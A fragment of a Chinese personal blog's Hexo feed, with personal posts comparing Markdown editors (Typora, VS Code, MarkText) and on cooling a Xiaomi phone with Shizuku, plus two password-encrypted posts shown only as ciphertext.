fd82543a375056ff335e179934ef98aba06122374d043d08b2f465bd4b39c920c5858cc46f7a7775549425448658c5548826b1c8a4d2361020931b46989b108b32cdbde9644188f1b2c941c73bc9e36b0f9ddf6d0cfe5fedc5c83d95fd1095e6c15cc25e7df5ee518bb8e914bc027aa8da3e66de7a2051145fa209f30492a9b024c55bfa2103e51bbc61b306f0440af4ed6f5e8135df339b5fcc1111d75671d1d5b79b190a671a2cbb4c0d1384ad78d139751f1f2a94a08119306571d32c2898f1d43aac81fdea055a2edeff887c7494d1974c9c6aa32287023eda10a2dcad4efef9499f530cb281cd67569e870c3a1cdfd84fb3c17ac10a178fbdee042faff6122cf1bc328639e978b956e6d67f89b68a78adfa96643d5879eb07cf9c4103d839de4b3a058e2f5c7d0937cfe2de015bb6f5c971234391fe5e5743188d56da90ab6fc0fc947415e387ec14a2936d66bdcbb98b5e7cdd6138c9c75f3907a290db34f8af36b5977fd86be5168d20392814e35cf2d75cb318c3dd12d3d73a46d461019ae6829fd491e9391c419b5b074dca4617f90cdfb5969286c5ecc6ddf2d569df5106e42cbe4bf625519d13ce6d245e4333df7cfc0ebd0d679de3df5f390525013e09f416bca675639ef0b1a07d4608a5fe5498781fcb81ef3bf953d35dd86896627d45f5c532807fd7b299676eb534cf2d9fc18aaa63c802b6d50b4d7da543f23d7d4e0df210383f5a204808e2ef72bf83932a77346e3df4275aafd288bc2320cda76604c0087dc412fec2bee530f9e78fcb1581ef3a3a6cd2d7e12c36a255de33e2a61c9d0826fe0fe5526349f0cfc646d89ccd45d67aa08808d002c5f312aca89180fb65cb59aaf85ebe4c8c3a6d9c72db6d379cb89e444db40163804a9d8c4c830752cb27cfdf57394996a174e9ca713e7a88b7ba1c108ff18eb123153712c22432b0a4763b3e74122d495098e6923a6e4f79aaa0fa301b95cf9ac646e81cb2f3afb6221be116aea53f42887559ca7b737941aaa5fddb15c5bd9abb6ddabfb405fafd18dac1374bca0740860d6ce7158b7f37bb679d3fd554dadca69e93a42e9112b3be945f3fd189f1f8b3718a02e29b2e7f6aeacff180c3d4db289d8ed0752b6a4f4a2a97c4a607349c51d1d5f8f8e15b7ba27a3ac03d9e6c3354093bde2cb0355043bec0b4a5b4ebba0345a8dab5603235a03dca4c3d62b89f66ed135a575af623cc92cc4fddd569ee2c26f2c4b177a579a3cec8eb1a3c53bc0b761fc5bace4a427086630e59bafd21b75fad44174598ffca6c99bd4db2a3e23d322cecb327dc84e172f6cfb7d568b87849f299359fd9b8c779eda1fdc1d7cac2710df03cfbfba0c636dacece06a469183f3a64b4e79b2627f184339c24ae3b9997f87d749fbed56866bcf29793fa9a703bc5af5827a41361c10ecabab825e810bd7689446a23460c94f284d0dc59328974b7d86345b58f2c24431c858df61485e7f379800a4ef87ac5f6f640495e49d7bd4eb62a3d392e987dfeae9fb37ed9065d9e65ca3c1f490f09b69c98f96c58</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【软件】仨markdown软件</title>
      <link href="/2022/09/24/markdownApp/"/>
      <url>/2022/09/24/markdownApp/</url>
      
        <content type="html"><![CDATA[<p>常见的有</p><ul><li>typora——现在出了正式版要收费</li><li>vscode——正在用，但是预览起来麻烦而且好像没啥智能提示</li><li>marktext——开源的，尝试了一下</li></ul><span id="more"></span><hr><h1 id="比较草率"><a href="#比较草率" class="headerlink" title="比较草率"></a>比较草率</h1><p>重点是在marktext上</p><hr><h2 id="1-typora"><a href="#1-typora" class="headerlink" title="1.typora"></a>1.typora</h2><p>这个挺好用的，至少在原生写md方面不错，但也如标题所示，正式版收费了，虽然网上应该也有那啥的。</p><img src="/2022/09/24/markdownApp/003.png" class=""><p>值得依赖的就是本身的ui和快捷键</p><h3 id="1-1-主题"><a href="#1-1-主题" class="headerlink" title="1.1 主题"></a>1.1 主题</h3><p><a href="https://theme.typora.io/">typora主题地址</a></p><p>在typora路径下有个themes文件夹，你找到合适的就可以下载过来然后解压，如果没有额外的内容跟.css匹配，就直接把解压目录下的.css文件copy到<code>typora/themes</code>下面就行</p><p>类似我这样：</p><img src="/2022/09/24/markdownApp/004.png" class=""><h3 id="1-2-常用快捷键"><a href="#1-2-常用快捷键" class="headerlink" title="1.2 常用快捷键"></a>1.2 常用快捷键</h3><ul><li>加粗： <code>Ctrl + B</code></li><li>标题： <code>Ctrl + H</code></li><li>插入链接： <code>Ctrl + K</code></li><li>字体倾斜：<code>Ctrl+I</code></li><li>下划线:<code>Ctrl+U</code></li><li>返回Typora顶部：<code>Ctrl+Home</code></li><li>返回Typora底部：<code>Ctrl+End</code></li><li>创建表格：<code>Ctrl+T</code></li><li>创建超链接:<code>Ctrl+K</code></li><li>搜索:<code>Ctrl+F</code></li><li>选中某句话:<code>Ctrl+L</code></li><li>选中某个单词:<code>Ctrl+D</code></li><li>选中相同格式的文字：<code>Ctrl+E</code></li><li>搜索并替换：<code>Ctrl+H</code></li><li>删除线：<code>Alt+Shift+5</code></li><li>插入图片：<code>Ctrl+Shift+I</code></li><li>引用：<code>Ctrl+Shift+Q</code></li><li>公式块:<code>Ctrl+Shift+M</code></li></ul><blockquote><p>优点：支持中文、ui也还行、最早用的就是这个<br>不舒服的地方，就是转换成html的适合typora的格式行间距有点离谱，多一行的。</p></blockquote><hr><h2 id="2-vscode"><a href="#2-vscode" class="headerlink" title="2.vscode"></a>2.vscode</h2><p>这玩意怎么说呢，就是个水桶，啥都可以装，但是纯度不高。<br>他也有大量markdown的插件，根据百度自行查找。</p><p>为什么用他呢，主要还是因为个人博客可能要用到html的部分，在vscode上比较习惯吧。</p><h3 id="2-1-vscode主题"><a href="#2-1-vscode主题" class="headerlink" title="2.1 vscode主题"></a>2.1 vscode主题</h3><p>这个不用多说了吧，挺简单的，网上搜一下，自带拓展下载的接口，下完设置里面替换就行了。</p><h3 id="2-2-快捷键"><a href="#2-2-快捷键" class="headerlink" title="2.2 快捷键"></a>2.2 快捷键</h3><p>这个比较常规，一般都通用。</p><h3 id="2-3-推荐markdown拓展"><a href="#2-3-推荐markdown拓展" class="headerlink" title="2.3 推荐markdown拓展"></a>2.3 推荐markdown拓展</h3><p><code>markdown all in one</code> —— 号称集成快捷键和一些功能，需要自己学习一下，我大致都知道源代码该怎么写就不怎么用了，但是会快捷键确实提升效率</p><p><code>markdown Preview Enhanced</code> —— 将预览界面背景调成白色，默认跟code主题一样<br>效果如图</p><img src="/2022/09/24/markdownApp/005.png" class=""><p><code>markdown Preview  Github Styling</code> —— 将预览界面风格改为github，可下可不下吧，如果是经常写readme.md这种还是有点用的，但是对于博客渲染来说一般般，因为博客自己有样式表渲染。<br><code>markdownlint</code> —— 这个我比较讨厌说实在，虽然是markdown的规范。。但是一堆高亮看着真不爽</p><blockquote><p>优点：水桶王<br>缺点：刚转过来可能不习惯吧，一股子源码风，但是谁叫hexo主题自有一套渲染</p></blockquote><hr><h2 id="3-marktext"><a href="#3-marktext" class="headerlink" title="3.marktext"></a>3.marktext</h2><p><strong>注意：可能需要科学工具有点慢</strong></p><p><a href="https://github.com/marktext/marktext#download-and-installation">marktext地址</a><br>是一个开源项目。</p><p>介绍里windows的下载有两种方式<br>Windows<br>Simply download and install MarkText via setup wizard (marktext-setup-%version%.exe) and choose whether to install per-user or machine wide. Alternatively, install MarkText using a package manager such as Chocolatey or Winget.</p><p>To use Chocolatey, you need to have Chocolatey installed:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install marktext</span><br></pre></td></tr></table></figure><p>To use Winget, you need to have Winget installed:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install marktext</span><br></pre></td></tr></table></figure><p>我用powershell下载的时候第一种老是超时[不知道是不是上科技会好一点]，后面就选第二种了，虽然这个速度也是真的慢的离谱</p><img src="/2022/09/24/markdownApp/000.png" class=""><p>足足等了个把小时吧。。哪怕是下源文件自己编译出来也好，这个仓库传过来忒慢了</p><hr><h3 id="marktext快捷键"><a href="#marktext快捷键" class="headerlink" title="marktext快捷键"></a>marktext快捷键</h3><blockquote><p>应该跟typora类似吧，毕竟一部分是系统快捷键</p></blockquote><table><thead><tr><th>⽂件</th><th></th></tr></thead><tbody><tr><td>新窗⼝</td><td>Ctrl+N</td></tr><tr><td>保存</td><td>Ctrl+S</td></tr><tr><td>粘贴纯⽂本</td><td>Ctrl+Shift+V</td></tr><tr><td>查找</td><td>Ctrl+F</td></tr><tr><td>关闭窗⼝</td><td>Ctrl+W</td></tr><tr><td>关闭选项卡</td><td>Ctrl+Shift+W</td></tr><tr><td>源代码模式</td><td>Alt+Ctrl+S</td></tr><tr><td>打字机模式</td><td>Alt+Ctrl+T</td></tr><tr><td>聚焦模式</td><td>Ctrl+Shift+J</td></tr><tr><td>侧边栏</td><td>Ctrl+J</td></tr><tr><td>显⽰标签栏</td><td>Alt+Ctrl+B</td></tr></tbody></table><table><thead><tr><th>⽂本</th><th></th></tr></thead><tbody><tr><td>标题</td><td>Ctrl+[1-6]</td></tr><tr><td>表格</td><td>Ctrl+Shift+T</td></tr><tr><td>列表</td><td>-</td></tr><tr><td>有序列表</td><td>1.</td></tr><tr><td>切换列表类型</td><td>Alt+Ctrl+U</td></tr><tr><td>列表紧凑模式</td><td>Alt+Ctrl+L</td></tr><tr><td>引⽤</td><td><code>&amp;gt;</code></td></tr><tr><td>代码块</td><td>Alt+Ctrl+C</td></tr><tr><td>分割线</td><td>***</td></tr><tr><td>图像</td><td>Ctrl+Shift+I</td></tr><tr><td>超链接</td><td>Ctrl+L</td></tr><tr><td>删除线</td><td>Ctrl+D</td></tr><tr><td>清除格式</td><td>Ctrl+Shift+I</td></tr><tr><td>⾼亮</td><td>Ctrl+Shift+H</td></tr><tr><td>标签</td><td>Ctrl+&#96;</td></tr></tbody></table><hr><h3 id="marktext试用"><a href="#marktext试用" class="headerlink" title="marktext试用"></a>marktext试用</h3><p>ui确实还行<br>不过默认语言是英语，<img src="/2022/09/24/markdownApp/002.png" class=""><br>想要改成中文好像不是直接就可以改的算是个小问题，对于英文不好的真的有点麻烦吧，网上也有教怎么改，自行<a href="https://www.baidu.com/">百度</a></p><img src="/2022/09/24/markdownApp/001.png" class=""><hr><p>说到底人还是存在一点点偏执，有的时候第一个用到的软件只要别太差，基本都不会说什么。typora这个也是我最早使用的，只不过那会倒不用参杂html的成分，所以比较自然，但是现在到了收费阶段，虽然我是白嫖用户~</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>习惯用哪个都行，如果单纯的编写md，带实时预览的都比vscode插件打开要好很多。<br>但是用于博客的话其实都差不多，毕竟最后转换成html，ui还是看这个博客主题的，你还要参杂html的代码，还是vsocde这样源代码风格合适一点，就是效率有点搞</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给爪机上点科技</title>
      <link href="/2022/09/16/phoneTest/"/>
      <url>/2022/09/16/phoneTest/</url>
      
        <content type="html"><![CDATA[<h1 id="u1s1，爪机配火龙三八夏天真的遭不住"><a href="#u1s1，爪机配火龙三八夏天真的遭不住" class="headerlink" title="u1s1，爪机配火龙三八夏天真的遭不住"></a>u1s1，爪机配火龙三八夏天真的遭不住</h1><p>原本打算root掉，但是有些数据太多懒得备份了，重新下和导入导出太费时间。</p><ul><li>phone：Xiaomi 11u</li><li>system：miui 13</li><li>12+256&#x2F;意义不大</li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ol><li>火龙三八发热量惊人。。手机温度一高就卡起来掉帧还掉电</li><li>相机也是个坑，过热会打不开，有的时候打开黑屏</li></ol><p>sou不了啊，root虽然看上去效果好但是懒得弄<br>之前在酷安上看到shizuku+小黑屋的方法，可以稍微减少点负担。不过也不治本。</p><blockquote><p>ps：如果没有科学上网，软件就只能自己酷安慢慢找包了</p></blockquote><hr><h2 id="shizuku"><a href="#shizuku" class="headerlink" title="shizuku"></a>shizuku</h2><p><a href="https://shizuku.rikka.app/zh-hans/guide/setup/">文档戳此处</a></p><p>我所使用的时无线调试启动<br><strong>注意：没有root的手机只能用无线调试或者电脑连接adb，这两种方法在手机重启后均会失效</strong></p><p>具体的跟着步骤来就行</p><p>还有一点下面的常见问题有写，就是输入配对码的时候直接提示失败，需要你去修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过无线调试启动：点击“输入配对码”后立刻提示失败</span><br><span class="line">MIUI（小米）</span><br><span class="line">在系统设置的“通知管理”-“通知显示设置”将通知样式切换为“原生样式”。</span><br></pre></td></tr></table></figure><p><strong>同时锁定后台，允许自启动，省电策略选择无设置，不然没法提权</strong></p><p>最后样式类似这样</p><img src="/2022/09/16/phoneTest/000.jpg" class=""><p>已授权一个应用是后面要说的小黑屋</p><hr><h2 id="小黑屋"><a href="#小黑屋" class="headerlink" title="小黑屋"></a>小黑屋</h2><p>同样的下载没有科学上网的前提大概率还是上酷安找包好了。</p><p>小黑屋没有什么需要搞的，因为弄完shizuku基本都配置好了，记得在shizuku给小黑屋权限，不然没法冻结app。</p><p>详细的列表也还是建议b站或者酷安参考，因为我也只参考了一部分，有些东西不确定的前提下还是留着吧</p><hr><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>平常发热是没这么高了，而且内存全部清空的时候剩余内存也比之前多，说明有些系统组件是真的没啥用，硬堆叠。。。</p><p>省电具体感知要看情况了，至少目前这两天没有感觉明显掉帧吧。【用了一年了手机电池好像也不咋地了】<br>而且我后台还挂着一个zeep life，就是小米运动改版，毕竟连这个手环。所以相对而言也还是再跑电。</p><p>只要别烫别乱掉帧咋样都行。</p><hr><h2 id="用了一段时间的体会"><a href="#用了一段时间的体会" class="headerlink" title="用了一段时间的体会"></a>用了一段时间的体会</h2><p>可能是用了一年多了，电池本身也掉电。<br>加上系统调度并不是很合理，还是堆叠的太多。<br>cpu是原罪，这发热量只配在冬天苟活</p><hr><h2 id="卒"><a href="#卒" class="headerlink" title="卒"></a>卒</h2><p>22.10.07 命中有此一劫，烧wifi了<br>22.10.08 送去寄修了<br>22.10.09 鉴定完免费修，等待寄回<br>22.10.11 到手，多了半年保修希望别整活</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>并非教程，只是简单记录，教程不如b站搜看视频来的直接~</p><p><a href="https://www.bilibili.com/">哔哩哔哩</a><br><a href="https://www.baidu.com/">百度</a><br><a href="https://cn.bing.com/">bing</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> phone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远控笔记</title>
      <link href="/2022/09/15/%E8%BF%9C%E6%8E%A7%E9%97%AE%E9%A2%98%E9%9B%86/"/>
      <url>/2022/09/15/%E8%BF%9C%E6%8E%A7%E9%97%AE%E9%A2%98%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2c8ceb4a7b5790dcc002b25b1fda9a5d36365c73e7255fba6c781a879318553b">00f12a94edcfed45ab71b2a7246c81261e01d1fa505e5892b81333e230b13502c734c6ad93d49903ce5b0ed00727df49eef7e71a3e3083e0227ee1fb2e1a2dfc5c3ec78009f74e2a76d396749e7c43c178d1e23a7b2da822e346d9b77bec62c655e709c847bead2dbc254cb4fcf5c1634a7b6601416d8d05226838991dd842ab85936c1f00029a82164e950817056de844ea08acf4526090e04689e879ac870ae5e5575f90e4333109bf847949e6130e2a0c7e6061fdbf9ecfca1066c6874a765c112ddee44a96aa975281a6d5e13cfd577eb53fb19a28db9f2dc241b8556a36f792aed54488bb257626d35b34a3dcb9d979628e2917ac62927af157c728f524ea20ae083268a9408b1ab4fd5aa4915b183169512824f24af3180463f17974fe83491fb89c13986147c1b6dd2a4cb0a0b3fb59386db66811880902669c4ffc63439b213163873af0ad43219075c85b56cde5d895655e0001803d76ad05ba8eb06f539e6c501c64b1e3fcb662dd5e3bc840678b3830f89bb20b15cef0437176abfc1c8b46bcdfa022712580a06fdc624993e27f16675b97aaf511bbb827d916d273c9fa41f3022608c0a49ba299702dafe3f645a24cf32c1c09716e9fe65f645e0b042f4fbae2feb53fd824c2569db3f4c4f6c2d41017c552416f19ad10bab3b43eef5a76a5c88c0f78f2effc5020cec11bfa70e52efcdde32de55823b01ebbc31b7c4e23bdf8410c34fbba3534d162a021ee2b5705c17a62a36af65558b1e01a2ed705cbad2fb8e85ed3f751b529992a0a338dd401f7c320d59b4936c7c1359bf809c10f8c81b36d18f0fadb56f8a015fa1a31f488c4dd77685f59b5366bc791fa7e57d3274bcdfa8af326c05d95e0c741b76c01c7c1c0762e7e510a9b42f360dcdf8d039d6862d3e73aaa835e125a67d06ef8c64ab2ce1a9182e86db3f6e2eb5304a1c4ef91d0f82366eb7c546b2462a3c1d8ea4accf9c739f40ab7d14a324c42f3839099b452b875eda80e561d9a5b5eb16eb9ec9b1372a60d669f6df7b8eba48db950c842f6e3198eb8716ed5142b7fc149675778660a2e3fa93d1c37c20640a746b537ece12a463cbf2354daa7ce37dbc3ca03f4afb96d2293b249c719c4a0082c70d27982e67995b6d975020ded86cc985849a20ba77a75923ee66043d4c8e6b4ce31c89e415ca470728230caed47abb962471d2a1d6d02570d0394f469a559c7e69dbf5df6c6738a755e6cb4360fca9a74a9ef8ef65e79af1aa7b143bc0f763b74dd8bdd1816aa409d50e8469c17e3898112647014910cfb81b921c917e7234dbb458a9ccce28d7cf4b8eff6ec287b69e1bcc4a6e84586c9eb2bef5e94c6decb06a083bcb0707ea6fe87e76d19abd12ca772c4821b70c9db0088bbcfaada4dc2f59c587a0f4596177931b3d55fc0e6cf28c22128815f234ddb2ad0b408c52308f3a5b764f59342afe3fe80a8e7c50732a983ab3a9d46828fac6886f75cd9a54a53d2bb4413dcdcbf94852f61d398bcf93d9c8c97d511f9552f8fce8d3b1989b7858446fe966db6bee23326805cbbfeb04578840da58f51cc94b022caa12bfaf49ad97ab79f6db3171a4eb9e604c8e04afb66bdd1fbd72dfffc89b97542a7bcb5ccf612da44f59ea98bfd236b25c07e11e22dbd130e917ccd5da3f2ad41c0e74246811eb8f88e2e829b8a7ece94cc1a7d04bdd076dc2e20fe1632942300f42ebc9b39e52ef21157e1f4be6918cc07258099c0e14adcaa729c38087f107c15719e6854983ee286730f01a679602ef3865fb259d36ce701be40efde710ba02c85fd76d0ef4eea3884edfe06373c4a11072530e9144953efbedd7c9b543bd92adfb4ac9b0d7a5fb9aa8d933c485827f57582cc63e30b1480fffd8542dbe5f9869d93a3f899325970dbfd2de718f90299a8de388f9bdf7ad59ee1d9fd643be2fa2fdafbd0488aee926aee84137a93dba4641d7740840501b482705970e674ad0ac9eb6241d6c8a562ab4fea47195b6938dc4d116f8ca9f5b27296c82d0ed848bdbbae1020acb03524a249cf86f1e2b8da8aa0b2b717d62d5f6d3402d4728eaae2dd3e2e835e929b064dbcb949e8faf82eeb332687ae9d47aebd23b8a950e3f20e1a55ad6afb2587354760171bc12e263cf8c42d1dd27b3adefeaa8d10f363935e3abead6b1ff9a37613331e59e7adff29eb82b41f3636f09c0898aaddb2a5ff337d9bb3e4047535c061120dcc0b6fde28d3aae467f98b4d23ec62aa83bc23164ae214b5a3f0e70a90ae48fbe39f2d27876800559ab474b6c77cc465d65d3c90fc8cef1407d6025b9e1ca52a786fea9939a1a339e691b2d3db81c730a18bc35acb8a5c36bb66e987d54edb553fd647753b9134770ee152e21cabce96ec0ec7901848829fad48a71df85898bf6d5f6d4aa561cd07e00391bacc1df575f5c6cc3dd263276b5693371d2a29e935f7e9a9d54f9eff3cc029c3173c68d244fcfc16fd653692176751f1cce27ef0f7aafda34d9a029382e5562c1b0d2e9ed96d70caf5413104532c6a37ded51ad0f365c4922e09106169c381662f43bac3ca787030f747b40a5b7fd69ca6e96ff72459d28d0fc43b0a1ae79b993e4a56d26f3ebf1c2c81c08f1710b2521aadd0abf8b1a8df0235af17cb766f2f933d9d36df29ba4967764d2dbd997c8209465f67943bc8ec9fbf299d230ecbe23a23daead87e12724176fd6c01d74b4f038f084b4daf9d0b78a0b1f829b0d475f58a31fc5b93f1910585eb27cf4bb930aa546275d848eee12825b8cda82e5df1f2bff0e51ebbe563279d47d69ab5820dca9b0dc9d23274727faaef3b036f9b125b472c497b899c356256663797aea2dd2f386467d881470952a161d9b7431348c11eb49e9c9d91c8e97205e892348174205e35860cec0bb207b11187b3508bc9f401ef95030af1416519a73e5604f4cd212442072517d735f75cd7517bcc94d401137fd4543d957f9d094ff8b4a97867803ab0be5de4e6fad920f6d69d9984bc89da77cb76da652a6cafd9919b27eefc1214516271245542d46f8410d02cf67dc0171112e09104f712bdd15f0f362efb4723a20d607780dd75f524e9b25e505e3fce19daa3dd9ef5ea6957b13083e83547211370d0d0362e96fd17485aa277b175989e5b50d1fb9a6ce9e6558d77de874efb96d2a04215d04caf6f63d30363707e6c0685997a8270c448857bd94db81c2e70cb7fcfcb6403daa5fcd863a7ead4112f471ce61f0e0c8b78b6047a4bfaa048e947850eba1846c6d3661b53d924aa5d64234b72224e60dcfea55418ff9dbbc3cf2f662b9f8a96db990633d12549a37ffaa583e3718d91ce7a4d6dad998e2d0dffefd85886148221ed5816b47d0c4e6fd1c0f7b816001fd869a9730c94d15698bb5f67c23420a08ea52c2d726a6726a4026e4d47ac1e2833db8382621d3638ad1b4c82736f40f0d6eb7c769c658fb7eea535e9b58cd1b850ce5ecddc5650095e08202b07b917712d2c73dfde74cb6af076cb5deb35de8071dfbc68d31022db0417b0d070a4fda978adb8b6b8d20cab55e9ff0b823780a629698d35b9071e42d981fd94b783b59cc23a7acc5599ecfe16ed942753c1b4f217b4f061a29b1547bdb418fd1c5fb81be566b07ef7303997171b74e22c40633285101d828321a7004f7de98a69b8f0f2766c325c26c24d448ac940c4f7822dd8b0f50063d64a0526b33d08e0b5f3314703893e5863edb553ab263a6501d7e19ae9ba08fa7129aae7a1bb767a1d860f91e7c53b0dbb7ccb9ae47efc8626d02be0a923ce430f878a6c65f685adfa5f1c28f189e39d255deb3fdd9916b9b4e705e41e317c50c1553e65a70ef4ef6c12d412a687de0bc57a0573019fcf72c2c12a5e7ccd9bc98c19e8f70bd4efbed9d3187ac0bbada1055fd303446da610cabf41eacc61c90d03f1e9d6503843c2e2efd8edb1c3d588f02daa8d0756ff1296c964ad2f690fbd6614bfb901c848893b8322f1cd9dcdec70961f912fcb1eb0253847546c074217b0309266eb3d8e2b842abea7d3e93fa0949dab8e403cc5e06c8aa33fc94b786d26229d1a7649438414a721fb5c332dc98b4be351bd81d224fb743a565b09e0d2e47d81a255a2e7b4c6ec8c422fff7df2bd74a141cbd789285ebaabc26ee1fbc78c353f13a7a9ff0698aef4e04dbdbbe0ac85e180773e016740ec2c2410aeee76fc758d5af624910d040771034184f549492889139636b4c82c3bd582e81a7d95183f77fecb5d00a6de95cde970cb77cafe22691362dabb192444598516b04462b74208fd754d182f5bb7c680d709073a3b72dea78f5a3b34cfc7cab9affac0739e12f96f901c2b8837ec9a0f883cf3355ccad08879689177309a6d08ed862f4c13c19773c4883eea3848c40aa306d9450606cce37bd185cb726b4a469a260e005894816ba6f8805507b539f512236a9cbccd54fc65831b20e2af47ac9be2100395b667101a75ec893d9967b2c89b9a8bb6ba271afebed2a5b055adf0e381aec6689496b637b6bc1c97c4e638fb2e3b715b96582e3079da17d5e4536b072a8ab054614723d081d3ff7d8d7ae817510c1cea842a88d143f504d1b39ca4d075135479f6af84bef25d9befb516cea9224fc459139abe36172d50a03aa3c3f60a34c6d886a2106bad1961053b76bde3b28f6fb69ffb0ed4c9941db741560fa5d42dbb700a721cb43b801132e66fa28c1cd5e1e06a2b55a7a782da598fa331c617640170965213c0eab72f2fb686f2698d0a923a7669f6527d8d4711806d12237549869cb09f28318313dd6b76cbf72fce84302113d441c46feb093d3b272ef96dae63c1be14d89e12e673374762f745dedd8aa5b98b292bbd8603f93f3ad28a37b2a108b33449ea2f3b9688374a29eef748fc7bda9b0c884c8fd5ea814d4f17af5566fa30c49f3fcfb7e523cae409179717339f333e1eabc7c49c9caab8c3fbb4850e19d47a187383bbc6e490b1eb8b8fcf6777cfffc0f205ea68639dae727758631677f470622e303c994e465e22f0cfb0e6766fff9a6603c13a179de531720551e9dcb35ea68428ebf4e15e7bd8de1c0caaad915fd2eed61202fcc5c6d8d7334129d27cddc13fbe63235ebc39685e44cd1ec07543ffc3dd3206264e635f7fd3c5a81a84a1c8479e7b7781ecb65acde86d2c164750db457c8586794071f51138a78c9b41d7f5d571e05d0c419e815c35d97db16e645f159ec661147686515971491489169d8a620ebadb687f178a151d16158b9f6c1e473aca2c8d6bb8bf349bc7dbfe5f2a8cf16af87d917528c01020fbac3262346ea6a94289daef519d0518325d9cf606d1f7c29db9f1c4a30d90bd42fdaff4a17ea33e68f355af95b5e46c4ea98e6ff65fda48cb477a00eafd2068754a0b809e7e8957ee4cabd45af01d14b6e94830876ffca73ee34a23a785e935f3a4e92238bb9138e7a43a3b942e2dceafaea1c7833c556b0fde69e79e045f4f36dd181c6bb00ddf5c858553d651a2e87836eef29c45cb74270f9295f5adc5b232d417a805e3a2e4c3cf2fae0cf5423c83bf4cf4ab303a609fbf03efcccd564670ae9d955d6a21552e1f352e2501d52ce365ce3185846c1ac675d78f369922378b641820ab7903f8754c48723e9f3ae8ebc8ddb48e73c030cccbbb404f2ca2eecd277c00c81da16a1756a943b2365e3f1f26657adf69d301f83c41a4435124768ac130911c160f203f765dd0e56f66a74682193314feef90488104bd6ec450f11731b1fb07018530118cf2a7be42b5d97a3690a1490ca27469c66f13c97dd3c8f5c72a10c4167e558eb75f8051fbd32f6081ffcc9358dc6294541f5a5869f99187b23aa06f7153023550adbc892f900e3535089ec6428620b33080e9f9936016c08893994256ae144eb77f5df76e21d7b5cc8e093eb67cdc4b46e9cae9aab562412ec4e612027f158fab2bc9044b2eb7e384eec3862b4764b692006b0a5c24896e7e818060213920c794a1b5617eb4da19dd06171366e8b453dc78214e3974b876d9a072dcb99773c4d087f8dac29c048b64608ce94268b948a23976e4e5c063f2fcd73b1fbdfda52a48ba5f35ab4ec78587eab6bdc4c43a4f5924dca3f7920973a26550e6585edc6ad716b76567dc87889baeb48476eefbac38fcd216e83d4f803e3369427cd4ea59cbf9aeb0776645bd2dbda4fdee39926e0c8bbbda08044981354d668979625b92ee355572de71112b8969e83d65a01ad4fa784509931813c4819690ddadca80a20bef793c82072b3d6406f8a589a6ee006da08cde27edd4d7d881a49414515f1617f84251d515ca4575056b82da38446515864187fb883591ae545ae0f83409cec7b31390b2002734864d7d2364dbfeba041449a0e67a8611d915cbfa3345a829d463134d536c13767f0b5eaf417ba05459602e9ed14dd411e54e972b01a4b213a423e00239a0890689254962dab7cfcf0f163fbaef60154f23527f3ab87eb7f737cb7ded88696c2da033bc0f41404dbccf06151dec99eb6317ed5a4149bbecdde34d370897c0b8e99e36efa783156c4878ecd7d1d917c8ba024e0b8cd509110626fb859439009629a9adc751ce708c3bddc55570b80ea2d2864e533d205816ead9db7a5bfbed610ae4326f131139ca14e936fd2dff5c2fb8682f4aba76537ad03c8c38b54272c8de621bbbf3185bc02be819665e34409dd8ec1ae68582a498f6bfb46f32676632a0ef8da543471f3e3bc1cbd2ad7793a7b0bc4b7833d119e667389ab94a77eb11b45b076a844cb5e0451a37030d2d230e1e22782aaec1857b5c0d20072756a430545d1a95565bd59f9903c770cebb7e74282877c20e5ba1412303177c0c742de69e510e91a0eaa7fd31876f6490d189ef3400c30a2ebdc660e6728f78c14ce228a7b67493ab4871d7cb3255e091066c3cf2e43a6ef2365332e816cd9615b744c10924d0ec2af4be2a2779b45583dc14d8df4216db121c1ecc89db439dce5fd1d421901c8b3a105da0d66b7c5c9e7d0fdbb017e852d6ba2348b0268dc591c72a5c035e8177e6f0801afaec6c0baf2827f3bbad095cb2e5c34c2b930d7cb223c4ccac3417f4531f1f4527c41d11498329f77246968eadd6cce72826f12b8a311afa5e54194d2018587de79c347aae2119cac6d8f55e2548d231b0bfe364c2be5099e90bbb8f8eefc5750cf69d0b329fa76a4ad5291477541627a989655f7a7c308106a57ab449ae73d69494acd0df1e255c3e77ba52843c06ee359701400d04e9f88bdf6d580768e35756bf2add06265ae2403a8cd9ec82adcec492206fff70387f589a2f8c90f2cdea00b6e9e2e60eafb489ea02dfb2b42259d563d016a56ad6c3f40136e27aef0f522a1ecb6d